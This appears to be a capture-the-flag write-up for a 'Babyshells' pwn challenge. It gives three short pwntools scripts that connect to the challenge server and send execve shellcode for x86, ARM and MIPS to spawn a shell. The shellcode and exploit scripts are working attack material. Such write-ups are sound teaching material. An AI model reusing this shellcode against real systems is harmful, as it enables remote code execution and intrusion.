# Babyshells - Pwn
> If you hold a babyshell close to your ear, you can hear a stack getting smashed

In this task we were given three binaries, in x86, ARM and MIPS respectively. All of them jumped into our buffer so we can send the shellcode directly on all three binaries. Then each binary gives one third of the flag. 

x86:
```
p=remote("52.30.206.11",7000)
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("gimme: ")
exploit = ""
exploit += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
p.sendline(exploit)
p.interactive()
```

ARM:
```
from pwn import *
 
p=remote("52.30.206.11",7001)
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("gimme: ")
exploit = ""
exploit += "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x92\x1a\x02\x92\x78\x46\x0e\x30\x01\x90\x01\xa9\x04\x1c\x07\x34\x22\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41\xc0\x46"
p.sendline(exploit)
p.interactive()
```

MIPS:
```
from pwn import *
 
p=remote("52.30.206.11",7002)
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("gimme: ")
exploit = ""
exploit += "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"
p.sendline(exploit)
p.interactive()
```
